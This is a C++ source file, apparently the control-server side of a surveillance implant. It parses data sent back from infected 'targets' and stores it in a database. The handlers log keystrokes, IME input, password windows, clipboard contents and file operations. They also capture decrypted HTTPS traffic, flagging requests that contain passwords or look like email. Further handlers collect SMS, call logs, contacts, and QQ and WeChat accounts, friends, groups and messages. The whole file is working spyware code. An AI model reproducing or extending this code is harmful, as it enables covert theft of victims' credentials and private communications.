//---------------------------------------------------------------------------
#include "AdkPrecomp.h"

#include "AdkFile.h"
#include "maindlg.h"
#include "target.h"
#include "Utility.h"
#include "DatabaseManager.h"
#include "processdatathread.h"
#include "targetdlg.h"
#include <shlwapi.h>

#include <QStringList>

#pragma comment(lib, "shlwapi.lib")

std::map<std::string, ProcCmdHandler>  commandHandlers;

//---------------------------------------------------------------------------
 ProcessDataThread::ProcessDataThread()
{
    RegisterCommandHandlers();
	m_handle = NULL;
}

// ////////////////////////////////////////////////////////////////////////////////
// @public 运行
//
void ProcessDataThread::run()
{
	BaseThreadProc pProc = (BaseThreadProc)&ProcessDataThread::WorkerThread;
	m_handle = CreateThread(
					NULL,
					0,
					*(PTHREAD_START_ROUTINE*)&pProc,
					this,
					0,
					0);
}

 // ////////////////////////////////////////////////////////////////////////////////
 // @public 获取句柄
 //
 HANDLE ProcessDataThread::handle()
 {
	 return m_handle;
 }

//---------------------------------------------------------------------------
DWORD  WINAPI ProcessDataThread::WorkerThread(LPVOID lParam)
{
    PDATA_BLOCK dataBlock = NULL;
	
    do
    {
        WaitForSingleObject(FrmMain->hEventForPlgData, INFINITE);

        // 不管怎么说，先得将数据处理完毕
        //
        while(true)
        {
            dataBlock = FrmMain->PopPlgDataBlock();
            if (dataBlock)
            {
                DispatchCommand(dataBlock);
                delete dataBlock;
            }
            else
            {
                break;
            }
        }

        if (FrmMain->bClosing)
        {
            break;
        }

    } while(TRUE);
    
    return 0;
}
//---------------------------------------------------------------------------
void  ProcessDataThread::RegisterCommandHandlers()
{
    if (commandHandlers.size() == 0)
    {
        commandHandlers["PEI"]  = &ProcessDataThread::Handle_PEI;
        commandHandlers["IME"]  = &ProcessDataThread::Handle_IME;
        commandHandlers["PWI"]  = &ProcessDataThread::Handle_PWI;
        commandHandlers["CBD"]  = &ProcessDataThread::Handle_CBD;
        commandHandlers["FOI"]  = &ProcessDataThread::Handle_FOI;
        
        commandHandlers["SSL"]  = &ProcessDataThread::Handle_SSL;
		commandHandlers["CAL"]  = &ProcessDataThread::Handle_CAL;
		commandHandlers["SMS"]  = &ProcessDataThread::Handle_SMS;
		commandHandlers["CONTACT"]  = &ProcessDataThread::Handle_CONTACT;
		commandHandlers["APP"] = &ProcessDataThread::Handle_APP;

    }

	m_appParsers["QQ"] = &ProcessDataThread::ProcessQQ;
	m_appParsers["MM"] = &ProcessDataThread::ProcessWeixin;
}
//---------------------------------------------------------------------------
int   ProcessDataThread::DispatchCommand(PDATA_BLOCK dataBlock)
{
    std::map<std::string, ProcCmdHandler>::iterator i = commandHandlers.find(dataBlock->args[0]);
    if (i != commandHandlers.end())
    {
        return (this->*commandHandlers[dataBlock->args[0]])(dataBlock);
    }

    return -1;
}
//---------------------------------------------------------------------------
int  ProcessDataThread::Handle_PEI(PDATA_BLOCK dataBlock)
{
	// PEI DATA TIME ProcNameBase64 ProcId DATALEN\r\n Data (CmdLine)
	//  0   1   2   3    4         5          6       7
	//

    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);
    
    LONG time = strtoul(args[2].c_str(),NULL,10);
	std::string procNameBase64 = args[3].c_str();
    ULONG procId = strtoul(args[4].c_str(), NULL, 10);

	std::wstring  content = std::wstring((PWCHAR)dataBlock->data.c_str(), dataBlock->dataLen / sizeof(WCHAR));

    DM->InsertPEIInfo(dataBlock->targetId,
                      time,
                      GetWideFromBase64(procNameBase64.c_str()),
                      procId,
                      content);
    return 0;
}
//---------------------------------------------------------------------------

int   ProcessDataThread::Handle_IME(PDATA_BLOCK dataBlock)
{
    // IME DATA TIME ProcNameBase64 ProcID CaptionBase64 DATALEN
	//  0   1   2   3    4         5          6        7            8
	//

    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);

    LONG time = strtoul(args[2].c_str(), NULL, 10);
	std::string procNameBase64 = args[3].c_str();
    DWORD procId = strtoul(args[4].c_str(), NULL, 10);
	std::string captionBase64 = args[5].c_str();

	std::wstring  content = std::wstring((PWCHAR)dataBlock->data.c_str(), dataBlock->dataLen / sizeof(WCHAR));

    DM->InsertIMEInfo(dataBlock->targetId,
                      time,
                      GetWideFromBase64(procNameBase64),
                      procId,
                      GetWideFromBase64(captionBase64),
                      content);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
	{
		TargetDlg* tarDlg = tar->frmTarControl;
		SendMessageW((HWND)tarDlg->winId(), WM_NEW_PLUGIN_DATA, (WPARAM)L"IME", (LPARAM)dataBlock);
	}
                      
    return 0;
}

//---------------------------------------------------------------------------
int   ProcessDataThread::Handle_PWI(PDATA_BLOCK dataBlock)
{
	// PWI DATA TIME ProcNameBase64 ProcID CaptionBase64 DATALEN\r\n
	//  0   1   2   3     4       5           6         7           8
	//

    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);

    LONG time = strtoul(args[2].c_str(),NULL,10);
    std::string procNameBase64 = args[3].c_str();
    ULONG procId = strtoul(args[4].c_str(), NULL, 10);
    std::string captionBase64  = args[5].c_str();

    std::wstring  passWin = std::wstring((PWCHAR)dataBlock->data.c_str(), dataBlock->dataLen / sizeof(WCHAR));

    DM->InsertPWIInfo(dataBlock->targetId,
                      time,
                      GetWideFromBase64(procNameBase64),
                      procId,
                      GetWideFromBase64(captionBase64),
                      passWin);
    return 0;
}
//---------------------------------------------------------------------------

int   ProcessDataThread::Handle_CBD(PDATA_BLOCK dataBlock)
{
	// TID PID CBD DATA TIME ProcNameBase64 ProcID DATALEN\r\n
	//  0   1   2   3     4        5          6	    7
	//
        
    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);
    
    LONG time = strtoul(args[2].c_str(),NULL,10);
    std::string procNameBase64 = args[3].c_str();
    ULONG procId = strtoul(args[4].c_str(), NULL, 10);

    std::wstring  clipContent = std::wstring((PWCHAR)dataBlock->data.c_str(), dataBlock->dataLen / sizeof(WCHAR));

    DM->InsertCBDInfo(dataBlock->targetId,
                      time,
                      GetWideFromBase64(procNameBase64),
                      procId,
                      clipContent);
    return 0;
}
//---------------------------------------------------------------------------
int  ProcessDataThread::Handle_FOI(PDATA_BLOCK dataBlock)
{
	// TID PID FOI DATA TIME PROCNAMEBase64 PROCID FILEOPTYPE DATALEN\r\n DataLen1 SrcFileName [DataLen2 DstFileName]
	//  0   1   2   3    4			5		  6		  7		  8
	//

    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);

    LONG time = strtoul(args[2].c_str(),NULL,10);
    std::string procNameBase64 = args[3].c_str();
    ULONG procId = strtoul(args[4].c_str(), NULL, 10);
    FileOpType opType = (FileOpType)atoi(args[5].c_str());

    PBYTE lpByte = (PBYTE)dataBlock->data.c_str();

    DWORD dwSrcDataLen = *((PDWORD)lpByte);
    lpByte += sizeof(DWORD);
    std::wstring srcFileName = std::wstring((PWCHAR)(lpByte ), dwSrcDataLen / sizeof(WCHAR));

    DWORD dwDstDataLen;
    std::wstring dstFileName = L"";

    if (dwSrcDataLen + sizeof(DWORD) < dataBlock->dataLen)
    {
        assert(FO_MOVEFILE == opType || FO_COPYFILE == opType);

        lpByte += dwSrcDataLen;
        
        dwDstDataLen = *((PDWORD)lpByte);
        lpByte += sizeof(DWORD);

        dstFileName = std::wstring((PWCHAR)(lpByte ), dwDstDataLen / sizeof(WCHAR));
    }

    DM->InsertFOIInfo(dataBlock->targetId,
                      time,
                      GetWideFromBase64(procNameBase64),
                      procId,                      
                      opType,
                      srcFileName,
                      dstFileName);

    return 0;
}
//---------------------------------------------------------------------------
int   ProcessDataThread::Handle_SSL(PDATA_BLOCK dataBlock)
{
    // SSL DATA TIME hKey ProcName ProcID ThreadID FinalFlag EncryptFlag DataLen\r\n
    //  0   1    2    3      4        5      6       7           8          9         10			11

    std::vector<std::string> & args = dataBlock->args;

    assert(dataBlock->dataLen > 0);
    if (dataBlock->dataLen == 0)
    {
        return 0;
    }

    Target * tarBlock = GetTargetFromGlobalMap(dataBlock->targetId);
    if (tarBlock == NULL)
    {
        return 0;
    }

    LONG   time = strtoul(args[2].c_str(), NULL, 10);
    ULONG  hKey = strtoul(args[3].c_str(), NULL, 10);
    int    encryptFlag = atoi(args[8].c_str());
    ULONG  procId    = strtoul(args[5].c_str(), NULL, 10);
    ULONG  threadId  = strtoul(args[6].c_str(), NULL, 10);
    int    finalFlag = atoi(args[7].c_str());    
    DWORD  dwPackageType = 0;
    DWORD  dwPassFlag = 0;

    std::string procNameBase64 = args[4].c_str();
    std::wstring widProcName = GetWideFromBase64(procNameBase64);
    std::wstring widHttpsDirName = tarBlock->widHttpsDataDir + L"\\" + widProcName + L"\\";

    AdkCreateDirectoryW(widHttpsDirName.c_str());

    // 写到本地数据目录中
    //      文件名的 日期_send.dat 或 日期_recv.dat
    //

    std::string opTimeStr = GetDateString(time);
    std::wstring widFileName;

    std::string sslData = dataBlock->data;
    std::string sslHost = "";
    
    // 针对下行数据，进行进一步处理
    //
    if (encryptFlag == 1)
    {
        widFileName = widHttpsDirName + AnsiToWide(opTimeStr) + L"_send.txt";

        if (strnicmp(sslData.c_str(), "Get", 3) == 0)
        {
            dwPackageType = 1;
        }

        if (strnicmp(sslData.c_str(), "Post", 4) == 0)
        {
            dwPackageType = 2;
        }

        if (dwPackageType > 0)
        {
            // 去除尾部的多余字符
            //
            const char * lpEnd = strstr(sslData.c_str(), "\r\n\r\n");
            if (lpEnd)
            {
                lpEnd += 4;
                UINT index = lpEnd - sslData.c_str();
                sslData = dataBlock->data.substr(0, index);
            }

            // 定位Host
            //
            int indexBeg = sslData.find("Host:");
            if (indexBeg != std::string::npos)
            {
                indexBeg += 5;
                int indexEnd = sslData.find("\r\n", indexBeg);
                sslHost = sslData.substr(indexBeg, indexEnd - indexBeg);
            }
        }

        // 密码识别
        //
        if ( StrStrIA(sslData.c_str(), "password")
            || StrStrIA(sslData.c_str(), "passwd")
            || StrStrIA(sslData.c_str(), "pwd") )
        {
            dwPassFlag = 1;
        }

        if (StrStrIA(sslData.c_str(), "subject") && StrStrIA(sslData.c_str(), "body"))
        {
            if (strchr(sslData.c_str(), '@') || StrStrIA(sslData.c_str(), "%40"))
            {
                dwPassFlag = 2;
            }
        }
    }
    else
    {
        widFileName = widHttpsDirName + AnsiToWide(opTimeStr) + L"_recv.txt";
        
        if (strnicmp(sslData.c_str(), "Http/", 5) == 0)
        {
            dwPackageType = 3;

            int index = sslData.find("\r\n");
            sslHost = sslData.substr(0, index);

            // 去除尾部的多余字符
            //
            const char * lpEnd = strstr(sslData.c_str(), "\r\n\r\n");
            if (lpEnd)
            {
                lpEnd += 4;
                UINT index = lpEnd - sslData.c_str();
                sslData = dataBlock->data.substr(0, index);
            }            
        }
    }
    
    DWORD dwByteWritten = 0;
    HANDLE hFile = CreateFileW(widFileName.c_str(),
                             GENERIC_ALL,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             NULL,
                             OPEN_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL,
                             NULL);
                             
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);
    
    // [时间] ProcessID ThreadID CryptHandle
    //
    char buf[1024];
    std::string aniTime = GetTimeString(time);
    if (dwPassFlag == 0)
    {
        sprintf(buf, "\r\n----------------------------------------------------------------------------------\r\n");
    }
    else
    {
        sprintf(buf, "\r\n**********************************************************************************\r\n");
    }
    
    WriteFile(hFile, buf, strlen(buf),&dwByteWritten, 0);
    sprintf(buf, "[%s] ProcessID: %d ThreadID: %d CryptHandle: %d\r\n", aniTime.c_str(), procId, threadId, hKey);
    WriteFile(hFile, buf, strlen(buf),&dwByteWritten, 0);
    WriteFile(hFile,  sslData.c_str(), sslData.size(), &dwByteWritten, 0);
    CloseHandle(hFile);

    if (dwPassFlag == 0)
    {
        return 0;
    }

    // 当前只关注发送数据
    //
    if (encryptFlag == 1)
    {
        // 只有密码信息才填入到数据库中
        //
        std::string opTimeStr = GetTimeString(time);
    
        int httpId = DM->InsertSSLInfo(dataBlock->targetId,
                          opTimeStr.c_str(),
                          hKey,
                          widProcName,
                          procId,
                          threadId,
                          dwPackageType,
                          encryptFlag,
                          dwPassFlag,
                          finalFlag,
                          sslHost.c_str(),
                          sslData.c_str(),
                          sslData.size());

        // 更新界面, 只有界面显示的时候才回进行更新
        //
        Target *tar = GetTargetFromGlobalMap(dataBlock->targetId);
        if (tar)
        {
            if (tar->frmTarControl)
            {
                if (tar->frmTarControl->bShowFlag)
                {
                    std::string aniTitle;
                    switch(dwPackageType)
                    {
                    case 0:
                        aniTitle = std::string("[") + opTimeStr + "] DATA";
                        break;
                    case 1:     // Get
                        aniTitle = std::string("[") + opTimeStr + "] GET :" + sslHost.c_str();
                        break;
                    case 2:     // Post
                        aniTitle = std::string("[") + opTimeStr + "] POST :" + sslHost.c_str();
                        break;
                    }

                    QStringList  *sl = new QStringList();
					sl->append(QString::fromStdWString(widProcName));
					sl->append(QString::fromLocal8Bit(aniTitle.c_str()));

                    SendMessage(tar->frmTarControl->Handle, WM_UPDATE_HTTPS, httpId, (LONG)(sl));

                    delete sl;
                }
            }
        }
    }

    return 0;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 短信
//
int ProcessDataThread::Handle_SMS(PDATA_BLOCK dataBlock)
{
	// SMS DATA Type AddressBase64 MessageBase64 Date\r\n
	//  0   1    2          3           4         5      
	//

	std::vector<std::string> & args = dataBlock->args;

	LONG type = strtoul(args[2].c_str(),NULL,10);
	std::string addressBase64 = args[3].c_str();
	std::string messageBase64 = args[4].c_str();
	std::string date = args[5].c_str();

	DM->InsertSMSInfo(
		dataBlock->targetId,
		AnsiToWide(date),
		type,
		GetWideFromBase64(addressBase64.c_str()),
		GetWideFromBase64(messageBase64.c_str())
		);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
	{
		TargetDlg* tarDlg = tar->frmTarControl;
		SendMessageW((HWND)tarDlg->winId(), WM_NEW_PLUGIN_DATA, (WPARAM)L"SMS", (LPARAM)dataBlock);
	}

	return 0;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 通话
//
int ProcessDataThread::Handle_CAL(PDATA_BLOCK dataBlock)
{
	// CAL DATA Type AddressBase64   ContryCode Date Duration\r\n
	//  0   1    2          3           4         5       6     
	//

	std::vector<std::string> & args = dataBlock->args;

	LONG type = strtoul(args[2].c_str(),NULL,10);
	std::string addressBase64 = args[3].c_str();
	std::string date = args[5].c_str();
	LONG duration = strtoul(args[6].c_str(), NULL, 0);

	DM->InsertCALInfo(
		dataBlock->targetId,
		GetWideFromBase64(date),
		type,
		GetWideFromBase64(addressBase64.c_str()),
		duration
		);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
	{
		TargetDlg* tarDlg = tar->frmTarControl;
		SendMessageW((HWND)tarDlg->winId(), WM_NEW_PLUGIN_DATA, (WPARAM)L"CAL", (LPARAM)dataBlock);
	}

	return 0;
}

int ProcessDataThread::Handle_CONTACT( PDATA_BLOCK dataBlock )
{
	//  0		1	 2 3  4
	// CONTACT DATA %s %s %s\r\n
	std::vector<std::string> & args = dataBlock->args;

	std::string nameBase64 = args[2].c_str();
	std::string phoneBase64 = args[3].c_str();
	std::string remarkBase64;

	if ( args.size() > 4 )
		remarkBase64 = args[4].c_str();
	else
		remarkBase64 = "";

	DM->InsertCONTACTInfo(
		dataBlock->targetId,
		GetWideFromBase64(nameBase64.c_str()),
		GetWideFromBase64(phoneBase64.c_str()),
		GetWideFromBase64(remarkBase64.c_str())
		);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
	{
		TargetDlg* tarDlg = tar->frmTarControl;
		SendMessageW((HWND)tarDlg->winId(), WM_NEW_PLUGIN_DATA, (WPARAM)L"CONTACT", (LPARAM)dataBlock);
	}

	return 0;
}

int ProcessDataThread::Handle_APP( PDATA_BLOCK dataBlock )
{
	std::vector<std::string> & args = dataBlock->args;

	if ( m_appParsers.find(args[1]) != m_appParsers.end() )
	{
		(this->*m_appParsers[args[1]])(dataBlock);
	}

	return 0;
}

int ProcessDataThread::ProcessQQ( PDATA_BLOCK dataBlock )
{
	std::vector<std::string> & args = dataBlock->args;

	if ( args[2] == "ACCOUNT" )
		QQAddAcount(dataBlock);
	else if ( args[2] == "FRIEND" )
		QQAddFriend(dataBlock);
	else if ( args[2] == "TROOP" )
		QQAddTroop(dataBlock);
	else if ( args[2] == "MSG")
		QQAddMessage(dataBlock);

	return 0;
}

int ProcessDataThread::ProcessWeixin( PDATA_BLOCK dataBlock )
{
	std::vector<std::string> & args = dataBlock->args;

	if ( args[2] == "ACCOUNT" )
		WeixinAddAcount(dataBlock);
	else if ( args[2] == "FRIEND" )
		WeixinAddFriend(dataBlock);
	else if ( args[2] == "MSG" )
		WeixinAddMessage(dataBlock);

	return 0;
}

void ProcessDataThread::QQAddAcount( PDATA_BLOCK dataBlock )
{
	// APP QQ ACCOUNT [QQ号]

	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 4);

	std::wstring qqNumber = GetWideFromBase64(args[3]);

	if ( DM->QQAccountExist(dataBlock->targetId, qqNumber) )
		return;

	DM->InsertQQAccount(dataBlock->targetId, qqNumber);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
		SendMessageW(tar->frmTarControl->Handle, WM_APP_QQ_ACCOUNT, 0, (LPARAM)dataBlock);
}

void ProcessDataThread::QQAddFriend( PDATA_BLOCK dataBlock )
{
	// APP QQ FRIEND [登录的账号] [QQ号] [昵称base64] [备注base64] [签名base64] [分组名base64]\r\n

	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 9);
	std::wstring owner = GetWideFromBase64(args[3]);
	std::wstring friendNumber = GetWideFromBase64(args[4]);
	std::wstring friendNickName = GetWideFromBase64(args[5]);
	std::wstring remark = GetWideFromBase64(args[6]);
	std::wstring signature = GetWideFromBase64(args[7]);
	std::wstring group = GetWideFromBase64(args[8]);

	if ( DM->QQFriendExist(dataBlock->targetId, owner, friendNumber) )
		return;

	DM->InsertQQFriend(dataBlock->targetId, owner, friendNumber, friendNickName, remark, signature, group);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
		SendMessageW(tar->frmTarControl->Handle, WM_APP_QQ_FRIEND, 0, (LPARAM)dataBlock);
}

void ProcessDataThread::QQAddTroop( PDATA_BLOCK dataBlock )
{
	// APP QQ TROOP [登录的账号] [群号] [群名base64] [群公告base64]
	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 7);
	std::wstring owner = GetWideFromBase64(args[3]);
	std::wstring troopNumber = GetWideFromBase64(args[4]);
	std::wstring troopName = GetWideFromBase64(args[5]);
	std::wstring troopMemo = GetWideFromBase64(args[6]);

	if ( DM->QQTroopExist(dataBlock->targetId, owner, troopNumber) )
		return;

	DM->InsertQQTroop(dataBlock->targetId, owner, troopNumber, troopName, troopMemo);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
		SendMessageW(tar->frmTarControl->Handle, WM_APP_QQ_TROOP, 0, (LPARAM)dataBlock);
}

void ProcessDataThread::QQAddMessage( PDATA_BLOCK dataBlock )
{
	// APP QQ MSG [登录的账号] [聊天类型] [对方QQ号/群号] [发送者QQ号] [发送者昵称base64] [时间base64] [消息类型] [消息内容]
	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 11);

	std::wstring owner = GetWideFromBase64(args[3]);
	int type = atoi(args[4].c_str());
	std::wstring containerNumber = GetWideFromBase64(args[5]);
	std::wstring senderNumber = GetWideFromBase64(args[6]);
	std::wstring senderName = GetWideFromBase64(args[7]);
	std::wstring sendTime = GetWideFromBase64(args[8]);
	int msgType = atoi(args[9].c_str());
	std::wstring content = AnsiToWide(args[10]);

	DM->InsertQQMessage(dataBlock->targetId, owner, type, containerNumber, senderNumber, senderName, sendTime, msgType, content);

}

void ProcessDataThread::WeixinAddAcount( PDATA_BLOCK dataBlock )
{
	// APP MM ACCOUNT [微信id] [昵称base64]
	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 5);
	std::wstring weixinId = GetWideFromBase64(args[3]);
	std::wstring nickName = GetWideFromBase64(args[4]);

	if ( DM->WeixinAccountExist(dataBlock->targetId, weixinId) )
		return;

	DM->InsertWeixinAccount(dataBlock->targetId, weixinId, nickName);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
		SendMessageW(tar->frmTarControl->Handle, WM_APP_WEIXIN_ACCOUNT, 0, (LPARAM)dataBlock);
}

void ProcessDataThread::WeixinAddFriend( PDATA_BLOCK dataBlock )
{
	// APP MM FRIEND [登录的微信id] [联系人的微信id] [昵称]
	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 6);
	std::wstring weixinId = GetWideFromBase64(args[3]);
	std::wstring friendId = GetWideFromBase64(args[4]);
	std::wstring friendNickName = GetWideFromBase64(args[5]);

	if ( DM->WeixinFriendExist(dataBlock->targetId, weixinId, friendId) )
		return;

	DM->InsertWeixinFrineds(dataBlock->targetId, weixinId, friendId, friendNickName);

	Target* tar = GetTargetFromGlobalMap(dataBlock->targetId);

	if ( tar && tar->frmTarControl )
		SendMessageW(tar->frmTarControl->Handle, WM_APP_WEIXIN_FRIEND, 0, (LPARAM)dataBlock);
}

void ProcessDataThread::WeixinAddMessage( PDATA_BLOCK dataBlock )
{
	// APP MM MSG [登录的微信id] [对方的微信id] [发送者微信 id] [时间base64] [消息类型] [消息内容]
	std::vector<std::string> & args = dataBlock->args;
	assert(args.size() == 9);

	std::wstring weixinId = GetWideFromBase64(args[3]);
	std::wstring friendId = GetWideFromBase64(args[4]);
	std::wstring senderId = GetWideFromBase64(args[5]);
	std::wstring sendTime = GetWideFromBase64(args[6]);
	int msgType = atoi(args[7].c_str());
	std::wstring content = AnsiToWide(args[8]);

	DM->InsertWeixinMessage(dataBlock->targetId, weixinId, friendId, senderId, sendTime, msgType, content);
}
